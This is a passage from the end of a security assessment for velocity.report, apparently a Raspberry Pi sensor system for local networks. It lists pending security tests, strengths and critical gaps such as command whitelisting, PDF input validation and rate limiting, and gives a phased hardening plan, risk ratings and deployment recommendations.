- [ ] Authentication bypass attempts (once implemented)
- [ ] Session hijacking tests (once sessions implemented)
- [ ] XSS in all user input fields (web frontend)

---

## 13. Conclusion

The velocity.report system requires **targeted security hardening** appropriate for its **internal LAN deployment context**. While traditional web security controls (authentication, TLS, CSRF) are low priority for trusted networks, protection against **malicious data injection and hardware damage** is critical.

### Deployment Context Assessment

**Appropriate for:**

- Internal network deployments (home LAN, private corporate network)
- Trusted user base with network-level access control
- Single Raspberry Pi sensors with local data storage

**NOT appropriate for:**

- Public internet exposure
- Multi-tenant environments
- Untrusted network segments

### Security Posture

**Strengths:**

- ✅ Comprehensive path traversal prevention (symlink-aware validation)
- ✅ Parameterized SQL queries (no SQL injection in current code)
- ✅ Privacy-by-design (no PII collection, local-only storage)
- ✅ Dedicated service user with proper permissions

**Critical Gaps (Phase 1 - MUST FIX):**

- ❌ No command whitelisting (hardware damage risk)
- ❌ Insufficient PDF input validation (code execution risk)
- ❌ No rate limiting (resource exhaustion risk)

**Low Priority for LAN (Phase 3 - Optional):**

- Authentication (network access = trusted boundary)
- HTTPS/TLS (no credential transmission, local cleartext acceptable)
- CSRF (no sessions to hijack without authentication)

### Immediate Action Plan

**Week 1-2: Phase 1 Implementation**

1. Command whitelist (2 days) - Prevent hardware damage
2. PDF input validation (2 days) - Prevent code injection
3. Path traversal audit (1 day) - Verify existing protections
4. Rate limiting (1 day) - Prevent resource exhaustion

**Total effort:** ~6 days for production-ready internal deployment

### Risk Assessment

**Current State:**

- **Internal LAN deployment:** MEDIUM RISK
- **Internet-facing deployment:** CRITICAL RISK (not recommended)

**After Phase 1:**

- **Internal LAN deployment:** LOW RISK (acceptable for production)
- **Internet-facing deployment:** HIGH RISK (requires Phase 3 auth/TLS)

### Deployment Recommendations

1. **Network Isolation:** Deploy on isolated VLAN or behind firewall
2. **Physical Security:** Raspberry Pi in secured location
3. **Access Control:** WiFi/network authentication as primary security boundary
4. **Monitoring:** Regular log review for anomalies
5. **Backups:** Daily automated database backups

**Approved Deployment Scenarios (after Phase 1):**

- ✅ Home network with WPA2+ WiFi security
- ✅ Corporate network with network access control
- ✅ Private VLAN with firewall rules
- ❌ Public internet exposure (requires full Phase 3)
- ❌ Shared hosting environments
- ❌ Untrusted multi-tenant networks

---

## Appendix A: Security Contact

For security issues, please report to: [SECURITY_EMAIL_HERE]

Do not disclose security vulnerabilities publicly until patched.

---

## Appendix B: References

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- CWE/SANS Top 25: https://cwe.mitre.org/top25/
- Go Security Best Practices: https://golang.org/doc/security/best-practices
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
